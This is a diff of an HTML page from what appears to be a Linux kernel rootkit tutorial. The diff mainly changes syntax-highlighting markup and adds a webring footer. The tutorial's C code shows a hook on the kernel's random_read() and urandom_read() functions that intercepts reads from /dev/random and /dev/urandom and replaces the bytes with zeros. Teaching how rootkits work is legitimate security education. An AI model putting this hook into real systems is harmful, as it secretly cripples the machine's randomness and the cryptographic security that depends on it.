@@ -219,15 +219,15 @@ Char Devices in Linux Although you might not recognise the name, you&amp;rsquo;r
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* trimmed for clarity */</span>
 </span></span><span style="display:flex;"><span>};
 </span></span></code></pre></div><p>This tells us that whenever something tries to read from <code>/dev/random</code> or <code>/dev/urandom</code>, the functions <code>random_read()</code> or <code>urandom_read()</code> are called respectively. Taking a look at one of these functions, <a href="https://github.com/torvalds/linux/blob/dd9fb9bb3340c791a2be106fdc895db75f177343/drivers/char/random.c#L1861">we find</a>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> ssize_t
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">random_read</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t nbytes, loff_t <span style="color:#f92672">*</span>ppos)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">ssize_t</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">random_read</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">size_t</span> nbytes, <span style="color:#66d9ef">loff_t</span> <span style="color:#f92672">*</span>ppos)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> ret;
 </span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> wait_for_random_bytes();
+</span></span><span style="display:flex;"><span>    ret <span style="color:#f92672">=</span> <span style="color:#a6e22e">wait_for_random_bytes</span>();
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> ret;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> urandom_read_nowarn(file, buf, nbytes, ppos);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">urandom_read_nowarn</span>(file, buf, nbytes, ppos);
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>This looks exactly like something we can hook!</p>
 <p>The guts of this function are fairly unimportant because our eventual hook will start off by calling this function in full anyway. What <em>is</em> important is the way the function is defined because we will need to emulate it in our rootkit. Notice that the 2nd and 3rd arguments are a <em>buffer</em> and a <em>size</em> - these are the arguments passed from <code>sys_read()</code> that we discussed earlier! Notice aswell the <code>__user</code> identifier - this will be very important a little later.</p>
@@ -239,16 +239,16 @@ Char Devices in Linux Although you might not recognise the name, you&amp;rsquo;r
 </span></span><span style="display:flex;"><span>ffffffff84c934a0 t random_read
 </span></span><span style="display:flex;"><span>ffffffff84c934d0 t urandom_read
 </span></span></code></pre></div><p>Okay, all good. The first thing we need to do now is get our function declarations right for the <em>original</em> copies:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">ssize_t</span> (<span style="color:#f92672">*</span>orig_random_read)(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t nbytes, loff_t <span style="color:#f92672">*</span>ppos);
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">ssize_t</span> (<span style="color:#f92672">*</span>orig_urandom_read)(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t nbytes, loff_t <span style="color:#f92672">*</span>ppos);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">ssize_t</span> (<span style="color:#f92672">*</span>orig_random_read)(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">size_t</span> nbytes, <span style="color:#66d9ef">loff_t</span> <span style="color:#f92672">*</span>ppos);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">ssize_t</span> (<span style="color:#f92672">*</span>orig_urandom_read)(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">size_t</span> nbytes, <span style="color:#66d9ef">loff_t</span> <span style="color:#f92672">*</span>ppos);
 </span></span></code></pre></div><p>Now we get to writing the actual hook. I&rsquo;m only going to through the hook for <code>random_read()</code> because it is <em>identical</em> for <code>urandom_read()</code>, except we stick an extra <code>u</code> in. You&rsquo;ll see why this is the case as we work through it.</p>
 <p>Recall that <code>sys_read()</code> returns the number of bytes successfully read? Well, <code>random_read()</code> does exactly the same thing! The very first thing our hook does is call <code>orig_random_read()</code> with all the arguments it&rsquo;s supplied with. Roughly, we have:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> asmlinkage ssize_t <span style="color:#a6e22e">hook_random_read</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t nbytes, loff_t <span style="color:#f92672">*</span>ppos)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> asmlinkage <span style="color:#66d9ef">ssize_t</span> <span style="color:#a6e22e">hook_random_read</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">size_t</span> nbytes, <span style="color:#66d9ef">loff_t</span> <span style="color:#f92672">*</span>ppos)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> bytes_read;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    bytes_read <span style="color:#f92672">=</span> orig_random_read(file, buf, nytes, ppos);
-</span></span><span style="display:flex;"><span>    printk(KERN_DEBUG <span style="color:#e6db74">&#34;rootkit: intercepted read to /dev/random: %d bytes</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, bytes_read);
+</span></span><span style="display:flex;"><span>    bytes_read <span style="color:#f92672">=</span> <span style="color:#a6e22e">orig_random_read</span>(file, buf, nytes, ppos);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printk</span>(KERN_DEBUG <span style="color:#e6db74">&#34;rootkit: intercepted read to /dev/random: %d bytes</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, bytes_read);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* do something to buf */</span>
 </span></span><span style="display:flex;"><span>
@@ -261,47 +261,47 @@ Char Devices in Linux Although you might not recognise the name, you&amp;rsquo;r
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>kbuf <span style="color:#f92672">=</span> NULL;
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> buf_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>kbuf <span style="color:#f92672">=</span> kzalloc(buf_size, GFP_KERNEL);
+</span></span><span style="display:flex;"><span>kbuf <span style="color:#f92672">=</span> <span style="color:#a6e22e">kzalloc</span>(buf_size, GFP_KERNEL);
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(kbuf)
-</span></span><span style="display:flex;"><span>    printk(KERN_ERROR <span style="color:#e6db74">&#34;could not allocate buffer</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printk</span>(KERN_ERROR <span style="color:#e6db74">&#34;could not allocate buffer</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">/* do something with the shiny new buffer */</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>kfree(kbuf);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">kfree</span>(kbuf);
 </span></span></code></pre></div><p>Pretty simple, right? The <code>GFP_KERNEL</code> flag indicates that this buffer is to be allocated in kernel memory - you can read more about the possible flags <a href="https://www.kernel.org/doc/htmldocs/kernel-api/API-kmalloc.html">here</a>.</p>
 <p>So, now we can use <code>copy_from_user()</code> to get the random bytes that were &ldquo;read&rdquo; from <code>/dev/random</code> (it&rsquo;s this step that we <em>could</em> skip because we only really need to copy the zero-filled buffer back to <code>buf</code>, but it&rsquo;ll be useful for later modules to see how this part works).</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">long</span> error;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>error <span style="color:#f92672">=</span> copy_from_user(kbuf, buf, bytes_read);
+</span></span><span style="display:flex;"><span>error <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(kbuf, buf, bytes_read);
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(error)
-</span></span><span style="display:flex;"><span>    printk(KERN_ERROR <span style="color:#e6db74">&#34;failed to copy from user space: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, error);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printk</span>(KERN_ERROR <span style="color:#e6db74">&#34;failed to copy from user space: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, error);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">/* Fill kbuf with 0x00 */</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>error <span style="color:#f92672">=</span> copy_to_user(buf, kbuf, bytes_read);
+</span></span><span style="display:flex;"><span>error <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_to_user</span>(buf, kbuf, bytes_read);
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(error)
-</span></span><span style="display:flex;"><span>    printk(KERN_ERROR <span style="color:#e6db74">&#34;failed to copy back to user space: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, error);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printk</span>(KERN_ERROR <span style="color:#e6db74">&#34;failed to copy back to user space: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, error);
 </span></span></code></pre></div><p>Putting it all together, we get the following hook:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> asmlinkage ssize_t <span style="color:#a6e22e">hook_random_read</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, size_t nbytes, loff_t <span style="color:#f92672">*</span>ppos)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> asmlinkage <span style="color:#66d9ef">ssize_t</span> <span style="color:#a6e22e">hook_random_read</span>(<span style="color:#66d9ef">struct</span> file <span style="color:#f92672">*</span>file, <span style="color:#66d9ef">char</span> __user <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">size_t</span> nbytes, <span style="color:#66d9ef">loff_t</span> <span style="color:#f92672">*</span>ppos)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> bytes_read, i;
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">long</span> error;
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>kbuf <span style="color:#f92672">=</span> NULL;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Call the real random_read() */</span>
-</span></span><span style="display:flex;"><span>    bytes_read <span style="color:#f92672">=</span> orig_random_read(file, buf, nbytes, ppos);
+</span></span><span style="display:flex;"><span>    bytes_read <span style="color:#f92672">=</span> <span style="color:#a6e22e">orig_random_read</span>(file, buf, nbytes, ppos);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Allocate a kernel buffer big enough to to hold everything */</span>
-</span></span><span style="display:flex;"><span>    kbuf <span style="color:#f92672">=</span> kzalloc(bytes_read, GFP_KERNEL);
+</span></span><span style="display:flex;"><span>    kbuf <span style="color:#f92672">=</span> <span style="color:#a6e22e">kzalloc</span>(bytes_read, GFP_KERNEL);
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Copy the random bytes from the userspace buf */</span>
-</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> copy_from_user(kbuf, buf, bytes_read);
+</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_from_user</span>(kbuf, buf, bytes_read);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Check for any errors in copying */</span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(error)
 </span></span><span style="display:flex;"><span>    {
-</span></span><span style="display:flex;"><span>        printk(KERN_DEBUG <span style="color:#e6db74">&#34;rootkit: %d bytes could not be copied into kbuf</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, error);
-</span></span><span style="display:flex;"><span>        kfree(kbuf);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printk</span>(KERN_DEBUG <span style="color:#e6db74">&#34;rootkit: %d bytes could not be copied into kbuf</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, error);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">kfree</span>(kbuf);
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> bytes_read;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
@@ -310,12 +310,12 @@ Char Devices in Linux Although you might not recognise the name, you&amp;rsquo;r
 </span></span><span style="display:flex;"><span>        kbuf[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00</span>;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Copy the rigged buffer back to userspace */</span>
-</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> copy_to_user(buf, kbuf, bytes_read);
+</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> <span style="color:#a6e22e">copy_to_user</span>(buf, kbuf, bytes_read);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(error)
-</span></span><span style="display:flex;"><span>        printk(KERN_DEBUG <span style="color:#e6db74">&#34;rootkit: %d bytes could not be copied back into buf</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, error);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printk</span>(KERN_DEBUG <span style="color:#e6db74">&#34;rootkit: %d bytes could not be copied back into buf</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, error);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Free the buffer before returning */</span>
-</span></span><span style="display:flex;"><span>    kfree(kbuf);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">kfree</span>(kbuf);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> bytes_read;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>As you can see, there isn&rsquo;t anything specific to <code>/dev/random</code> here, so the exact same goes for the <code>hook_urandom_read()</code> function too (and any other char device you want to interfere with!).</p>
@@ -427,6 +427,21 @@ Char Devices in Linux Although you might not recognise the name, you&amp;rsquo;r
 
 <script src="/assets/main.js"></script>
 <script src="/assets/prism.js"></script>
+
+<div class="footer__webring">
+    <span>
+        <div>
+            this site is part of the <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi'>HauNTed wEbriNg</a>
+        </div>
+        <div>
+            <p>
+                <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi?before=https://xcellerator.github.io/'>&lt;&lt;&lt;</a>
+                <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi?random=https://xcellerator.github.io/'>RaNDom</a>
+                <a href='https://pixeldreams.tokyo/cgi-bin/webring.cgi?after=https://xcellerator.github.io/'>&gt;&gt;&gt;</a>
+            </p>
+        </div>
+    </span>
+</div>
 
 
 
